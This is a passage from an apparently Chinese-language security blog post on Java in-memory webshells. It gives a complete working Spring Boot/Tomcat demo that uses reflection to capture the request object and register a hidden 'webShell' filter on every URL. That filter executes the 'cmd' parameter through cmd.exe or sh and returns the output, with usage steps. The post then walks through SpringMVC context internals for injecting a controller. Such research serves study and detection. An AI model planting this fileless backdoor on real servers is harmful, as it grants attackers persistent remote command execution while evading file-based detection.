<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200404160824554.png" alt="image-20200404160824554"></p>
<p>创建的顺序是根据filterMaps的顺序来的，只要将自己的filter放在filterMaps最前面即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext.findFilterMaps();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (filterMaps[i].getFilterName().equalsIgnoreCase(<span class="string">&quot;webShell&quot;</span>)) &#123;org.apache.tomcat.util.descriptor.web.<span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> filterMaps[i];</span><br><span class="line">    filterMaps[i] = filterMaps[<span class="number">0</span>];</span><br><span class="line">    filterMaps[<span class="number">0</span>] = filterMap;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200404161502200.png" alt="image-20200404161502200"></p>
<h3 id="完整Demo"><a href="#完整Demo" class="headerlink" title="完整Demo"></a>完整Demo</h3><p>直接在spring boot项目测试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//获取各字段</span></span><br><span class="line">            java.lang.reflect.Field WRAP_SAME_OBJECT=Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">applicationFilterChain</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> applicationFilterChain.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> applicationFilterChain.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//去掉final修饰符</span></span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> java.lang.reflect.Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            modifiers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            modifiers.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">            modifiers.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">            modifiers.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置允许访问</span></span><br><span class="line">            WRAP_SAME_OBJECT.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//如果是第一次请求，则修改各字段，否则获取cmd参数执行命令并返回结果</span></span><br><span class="line">            <span class="keyword">if</span>(!WRAP_SAME_OBJECT.getBoolean(<span class="literal">null</span>))&#123;</span><br><span class="line">                WRAP_SAME_OBJECT.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ThreadLocal&lt;javax.servlet.ServletRequest&gt; threadLocalRequest = (ThreadLocal&lt;javax.servlet.ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);</span><br><span class="line">                javax.servlet.<span class="type">ServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> threadLocalRequest.get();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    javax.servlet.ServletContext servletContext=request.getServletContext();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//判断是否已有该名字的filter，有则不再添加</span></span><br><span class="line">                    <span class="keyword">if</span> (servletContext.getFilterRegistration(<span class="string">&quot;webShell&quot;</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">class</span> <span class="title class_">WebShell</span> <span class="keyword">implements</span> <span class="title class_">javax</span>.servlet.Filter&#123;</span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(javax.servlet.ServletRequest request, javax.servlet.ServletResponse response, javax.servlet.FilterChain chain)</span> <span class="keyword">throws</span> java.io.IOException, javax.servlet.ServletException &#123;</span><br><span class="line">                                System.out.println(<span class="string">&quot;filter&quot;</span>);</span><br><span class="line">                                String cmd=request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span>(cmd!=<span class="literal">null</span>) &#123;</span><br><span class="line">                                    String[] cmds = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                                    <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                                        cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                        cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">                                    &#125;</span><br><span class="line"></span><br><span class="line">                                    java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                                    java.util.<span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                                    java.io.<span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">                                    writer.write(output);</span><br><span class="line">                                    writer.flush();</span><br><span class="line">                                    writer.close();</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                chain.doFilter(request, response);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">//因为门面模式的使用，此处servletContext实际是ApplicationContextFacade，需要提取ApplicationContext</span></span><br><span class="line">                        java.lang.reflect.Field contextField=servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                        contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        org.apache.catalina.core.<span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">//获取ApplicationContext中的StandardContext</span></span><br><span class="line">                        contextField=applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                        contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        org.apache.catalina.core.StandardContext standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">//修改state</span></span><br><span class="line">                        java.lang.reflect.Field stateField=org.apache.catalina.util.LifecycleBase.class.getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">                        stateField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">//注册filter</span></span><br><span class="line">                        javax.servlet.FilterRegistration.<span class="type">Dynamic</span> <span class="variable">filterRegistration</span> <span class="operator">=</span> servletContext.addFilter(<span class="string">&quot;webShell&quot;</span>, <span class="keyword">new</span> <span class="title class_">WebShell</span>());</span><br><span class="line">                        filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="literal">false</span>,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/*&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">//添加到filterConfigs</span></span><br><span class="line">                        java.lang.reflect.<span class="type">Method</span> <span class="variable">filterStartMethod</span> <span class="operator">=</span> org.apache.catalina.core.StandardContext.class.getMethod(<span class="string">&quot;filterStart&quot;</span>);</span><br><span class="line">                        filterStartMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        filterStartMethod.invoke(standardContext, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">//调整filter位置</span></span><br><span class="line">                        org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext.findFilterMaps();</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (filterMaps[i].getFilterName().equalsIgnoreCase(<span class="string">&quot;webShell&quot;</span>)) &#123;</span><br><span class="line">                                org.apache.tomcat.util.descriptor.web.<span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> filterMaps[i];</span><br><span class="line">                                filterMaps[i] = filterMaps[<span class="number">0</span>];</span><br><span class="line">                                filterMaps[<span class="number">0</span>] = filterMap;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">//恢复成LifecycleState.STARTE，否则会造成服务不可用</span></span><br><span class="line">                        stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先访问两次test路由（第一次请求修改属性，第二次得到request注册filter）</p>
<p>然后带上cmd参数访问任意url即可</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200404163723746.png" alt="image-20200404163723746"></p>
<h3 id="局限-3"><a href="#局限-3" class="headerlink" title="局限"></a>局限</h3><p>受限于获取request的方法，同样，在shiro中也是不能成功的</p>
<h2 id="SpringMVC内存WebShell"><a href="#SpringMVC内存WebShell" class="headerlink" title="SpringMVC内存WebShell"></a>SpringMVC内存WebShell</h2><p>在不使用注解和修改配置文件的情况下，使用纯 java 代码来获得当前代码运行时的上下文环境，在上下文环境中手动注册一个 controller，controller 中写入 WebShell 逻辑</p>
<h3 id="SpringMvc工作原理"><a href="#SpringMvc工作原理" class="headerlink" title="SpringMvc工作原理"></a>SpringMvc工作原理</h3><p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200406102012794.png" alt="image-20200406102012794"></p>
<ol>
<li><p>用户发送请求至前端控制器DispatcherServlet</p>
</li>
<li><p>DispatcherServlet收到请求调用HandlerMapping处理器映射器</p>
</li>
<li><p>处理器映射器找到具体的处理器(可以根据xml配置、注解进行查找)，生成处理器对象及处理器拦截器(如果有则生成)一并返回给DispatcherServlet</p>
</li>
<li><p>DispatcherServlet调用HandlerAdapter处理器适配器</p>
</li>
<li><p>HandlerAdapter经过适配调用具体的处理器(Controller，也叫后端控制器)</p>
</li>
<li><p>Controller执行完成返回ModelAndView</p>
</li>
<li><p>HandlerAdapter将controller执行结果ModelAndView返回给DispatcherServlet</p>
</li>
<li><p>DispatcherServlet将ModelAndView传给ViewReslover视图解析器</p>
</li>
<li><p>ViewReslover解析后返回具体View</p>
</li>
<li><p>DispatcherServlet根据View进行渲染视图（即将模型数据填充至视图中）</p>
</li>
<li><p>DispatcherServlet响应用户</p>
</li>
</ol>
<p>在spring中bean是被Spring IoC容器管理的一个个对象，BeanFactory接口是Spring IoC容器的实际代表者，ApplicationContext接口继承了BeanFactory接口，并通过继承其他接口进一步扩展了基本容器的功能，因此，org.springframework.context.ApplicationContext接口也代表了IoC容器 ，它负责实例化、定位、配置应用程序中的对象(bean)及建立这些对象间的依赖</p>
<p>IoC容器通过读取配置元数据来获取对象的实例化、配置和组装的描述信息。配置的零元数据可以用xml、Java注解或Java代码来表示</p>
<h4 id="典型的SpringMvc项目配置"><a href="#典型的SpringMvc项目配置" class="headerlink" title="典型的SpringMvc项目配置"></a>典型的SpringMvc项目配置</h4><p>web.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcher<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/dispatcher-servlet.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcher<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>dispatcher-servlet.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/WEB-INF/jsp/&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.jsp&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;/hello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.l3yx.controller.HelloController&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="ContextLoaderListener"><a href="#ContextLoaderListener" class="headerlink" title="ContextLoaderListener"></a>ContextLoaderListener</h4><ul>
<li>Spring 应用中可以同时有多个 Context，其中只有一个 Root Context，剩下的全是 Child Context</li>
<li>所有Child Context都可以访问在 Root Context中定义的 bean，但是Root Context无法访问Child Context中定义的 bean</li>
<li>所有的Context在创建后，都会被作为一个属性添加到了 ServletContext中</li>
</ul>
<p>ContextLoaderListener实质是一个listener，主要被用来初始化全局唯一的Root Context，即 Root WebApplicationContext，在web应用启动的，ContextLoaderListener读取contextConfigLocation中定义的xml文件，自动装配ApplicationContext的配置信息，并产生WebApplicationContext对象，然后将这个对象放置在ServletContext的属性里，这样我们就可以在servlet里得到WebApplicationContext对象</p>
<p>web.xml 中其相关配置如下</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200406141426216.png" alt="image-20200406141426216"></p>
<p>依照规范，当没有显式配置 ContextLoaderListener 的 contextConfigLocation 时，程序会自动寻找 &#x2F;WEB-INF&#x2F;applicationContext.xml作为配置文件，所以其实上面的 <code>&lt;context-param&gt; </code>标签对可以去掉</p>
<h4 id="DispatcherServlet"><a href="#DispatcherServlet" class="headerlink" title="DispatcherServlet"></a>DispatcherServlet</h4><p>DispatcherServlet实质是一个servlet，主要作用是处理传入的web请求，根据配置的 URL pattern，将请求分发给正确的 Controller 和 View，DispatcherServlet 初始化完成后，会创建一个普通的 Child Context 实例</p>
<p>web.xml 中相关配置如下</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200406141804744.png" alt="image-20200406141804744"></p>
<p>依照规范，当没有显式配置 contextConfigLocation 时，程序会自动寻找<code>/WEB-INF/&lt;servlet-name&gt;-servlet.xml</code>，作为配置文件。因为上面的<code> &lt;servlet-name&gt;</code> 是 dispatcher，所以当没有显式配置时，程序依然会自动找到 &#x2F;WEB-INF&#x2F;dispatcher-servlet.xml 配置文件</p>
<p>综上，每个具体的 DispatcherServlet 创建的是一个 Child Context，代表一个独立的 IoC 容器，而 ContextLoaderListener 所创建的是一个 Root Context，代表全局唯一的一个公共 IoC 容器</p>
<p>如果要访问和操作 bean ，一般要获得当前代码执行环境的IoC 容器 代表者 ApplicationContext</p>
<h3 id="获取context"><a href="#获取context" class="headerlink" title="获取context"></a>获取context</h3><h4 id="Root-Context-创建过程"><a href="#Root-Context-创建过程" class="headerlink" title="Root Context 创建过程"></a>Root Context 创建过程</h4><p>Servlet容器会实例化ContextLoaderListener</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200406191547249.png" alt="image-20200406191547249"></p>
<p>org.springframework.web.context.ContextLoaderListener</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200406191602191.png" alt="image-20200406191602191"></p>
<p>该类继承ContextLoader，实现了ServletContextListener接口，使之具有listener功能，并且在contextInitialized方法中获得ServletContext</p>
<p>主要初始化任务在initWebApplicationContext(event.getServletContext())，该方法由其父类ContextLoader实现</p>
<p>org.springframework.web.context.ContextLoader#initWebApplicationContext</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200406193255750.png" alt="image-20200406193255750"></p>
<p>通过servletContext创建了WebApplicationContext ，并把WebApplicationContext 作为一个属性存入了servletContext，属性名为WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE</p>
<p>然后将其放入了currentContextPerThread中</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200406204019991.png" alt="image-20200406204019991"></p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200406204033878.png" alt="image-20200406204033878"></p>
<h4 id="Child-Context-创建过程"><a href="#Child-Context-创建过程" class="headerlink" title="Child Context 创建过程"></a>Child Context 创建过程</h4><p>load-on-startup &gt; 0，该servlet将会在web容器启动的时候做实例化处理</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200406200137378.png" alt="image-20200406200137378"></p>
<p>在DispatcherServlet的父类HttpServletBean作初始化，并调用initServletBean</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200406200629861.png" alt="image-20200406200629861"></p>
<p>org.springframework.web.servlet.FrameworkServlet#initServletBean</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200406200915311.png" alt="image-20200406200915311"></p>
<p>org.springframework.web.servlet.FrameworkServlet#initWebApplicationContext</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200406201156417.png" alt="image-20200406201156417"></p>
<p>首先通过ServletContext获取rootContext，然后传入rootContext创建WebApplicationContext</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200406201315841.png" alt="image-20200406201315841"></p>
<p>最终在org.springframework.web.servlet.FrameworkServlet#createWebApplicationContext创建完成并返回</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200406201416315.png" alt="image-20200406201416315"></p>
<p>在org.springframework.web.servlet.FrameworkServlet#initWebApplicationContext，把Child Context作为一个属性存入了servletContext，属性名为org.springframework.web.servlet.FrameworkServlet.CONTEXT.dispatcher</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200406202434577.png" alt="image-20200406202434577"></p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200406202601018.png" alt="image-20200406202601018"></p>
<p>并且在org.springframework.web.servlet.DispatcherServlet#doService中，可以看见每次请求时都将Child Context作为一个属性存入了request，属性名为org.springframework.web.servlet.DispatcherServlet.CONTEXT</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200406203016146.png" alt="image-20200406203016146"></p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200406203116229.png" alt="image-20200406203116229"></p>
<h4 id="获取Root-Context"><a href="#获取Root-Context" class="headerlink" title="获取Root Context"></a>获取Root Context</h4><h5 id="ContextLoader-getCurrentWebApplicationContext"><a href="#ContextLoader-getCurrentWebApplicationContext" class="headerlink" title="ContextLoader.getCurrentWebApplicationContext"></a>ContextLoader.getCurrentWebApplicationContext</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> ContextLoader.getCurrentWebApplicationContext();</span><br></pre></td></tr></table></figure>

<p>Root Context实由ContextLoader创建，该类中也有相应的获取方法，而且是一个静态方法，也就是从前文中所说的currentContextPerThread中获取的</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200406204123559.png" alt="image-20200406204123559"></p>
